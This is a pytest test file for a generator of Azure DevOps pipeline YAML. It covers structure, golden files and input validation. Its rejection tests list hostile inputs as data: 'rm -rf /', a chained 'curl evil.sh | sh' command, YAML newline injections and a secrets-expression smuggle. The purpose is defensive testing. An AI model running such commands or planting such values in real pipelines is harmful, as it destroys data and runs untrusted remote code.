from pathlib import Path

import pytest
import yaml

from app.contracts import ResourceSpec
from app.devops.pipeline_gen import generate_pipeline, validate_yaml

GOLDEN = Path(__file__).parent / "golden"
APP = "demo-app-x7k2"


def spec(runtime="python", **params):
    return ResourceSpec(type="pipeline", name="demo-app", runtime=runtime, params=params)


def all_steps(data):
    out = []
    for stage in data["stages"]:
        for job in stage["jobs"]:
            out += job.get("steps", [])
            out += job.get("strategy", {}).get("runOnce", {}).get("deploy", {}).get("steps", [])
    return out


def tasks(data):
    return {s["task"]: s for s in all_steps(data) if "task" in s}


def script(data):
    return next(s["script"] for s in all_steps(data) if "script" in s)


# ---------- structure ----------

def test_python_pipeline_structure():
    data = yaml.safe_load(generate_pipeline(spec(), APP))
    assert data["trigger"]["branches"]["include"] == ["main"]
    assert data["pool"]["vmImage"] == "ubuntu-latest"
    assert [s["stage"] for s in data["stages"]] == ["Build", "Deploy"]
    assert data["stages"][1]["dependsOn"] == "Build"
    assert tasks(data)["UsePythonVersion@0"]["inputs"]["versionSpec"] == "3.12"
    deploy = tasks(data)["AzureWebApp@1"]["inputs"]
    assert deploy["appName"] == APP
    assert deploy["azureSubscription"] == "sc-azure"
    assert deploy["appType"] == "webAppLinux"
    assert "pytest" in script(data)


def test_node_pipeline_structure():
    data = yaml.safe_load(generate_pipeline(spec("node"), APP))
    assert tasks(data)["NodeTool@0"]["inputs"]["versionSpec"] == "20.x"
    assert "npm test" in script(data)
    assert tasks(data)["AzureWebApp@1"]["inputs"]["appName"] == APP


def test_runtime_defaults_to_python_and_is_case_insensitive():
    assert "UsePythonVersion@0" in tasks(yaml.safe_load(generate_pipeline(spec(None), APP)))
    assert "NodeTool@0" in tasks(yaml.safe_load(generate_pipeline(spec("NODE"), APP)))


def test_branch_and_service_connection_are_used():
    text = generate_pipeline(spec(branch="develop"), APP, service_connection="sc-student")
    data = yaml.safe_load(text)
    assert data["trigger"]["branches"]["include"] == ["develop"]
    assert tasks(data)["AzureWebApp@1"]["inputs"]["azureSubscription"] == "sc-student"


def test_allowed_test_command_override():
    data = yaml.safe_load(generate_pipeline(spec(test_command="python -m pytest"), APP))
    assert "python -m pytest" in script(data)


def test_output_is_stable_and_has_no_azure_expressions():
    first, second = generate_pipeline(spec(), APP), generate_pipeline(spec(), APP)
    assert first == second
    assert "${{" not in first


# ---------- inputs from the model are checked ----------

def test_unsupported_runtime_is_rejected():
    with pytest.raises(ValueError, match="Unsupported runtime"):
        generate_pipeline(spec("java"), APP)


@pytest.mark.parametrize("bad", ["x'\n  evil: 1", "bad name", "", "a", "a" * 61, "${{ secrets.X }}"])
def test_bad_app_names_are_rejected(bad):
    with pytest.raises(ValueError, match="Invalid app name"):
        generate_pipeline(spec(), bad)


@pytest.mark.parametrize("bad", ["rm -rf /", "pytest; curl evil.sh | sh", "npm test"])
def test_bad_test_commands_are_rejected_for_python(bad):
    with pytest.raises(ValueError, match="Invalid test command"):
        generate_pipeline(spec(test_command=bad), APP)


def test_bad_branch_and_service_connection_are_rejected():
    with pytest.raises(ValueError, match="Invalid branch"):
        generate_pipeline(spec(branch="main\n  evil: 1"), APP)
    with pytest.raises(ValueError, match="Invalid service connection"):
        generate_pipeline(spec(), APP, service_connection="my connection")


# ---------- validate_yaml ----------

def test_validate_yaml_missing_key():
    with pytest.raises(ValueError, match="stages"):
        validate_yaml("trigger: x\npool: y\n")


def test_validate_yaml_no_stages():
    with pytest.raises(ValueError, match="no stages"):
        validate_yaml("trigger:\n  branches:\n    include: [main]\npool:\n  vmImage: x\nstages: []\n")


def test_validate_yaml_stage_without_jobs():
    with pytest.raises(ValueError, match="job"):
        validate_yaml("trigger: x\npool: y\nstages:\n  - stage: Build\n")


def test_validate_yaml_bad_syntax():
    with pytest.raises(ValueError, match="not valid YAML"):
        validate_yaml("trigger: [unclosed\n")


def test_validate_yaml_not_a_mapping():
    with pytest.raises(ValueError, match="mapping"):
        validate_yaml("- a\n- b\n")


# ---------- golden files ----------

@pytest.mark.parametrize("runtime", ["python", "node"])
def test_matches_golden_file(runtime):
    expected = (GOLDEN / f"{runtime}_pipeline.yml").read_text(encoding="utf-8")
    assert generate_pipeline(spec(runtime), APP) == expected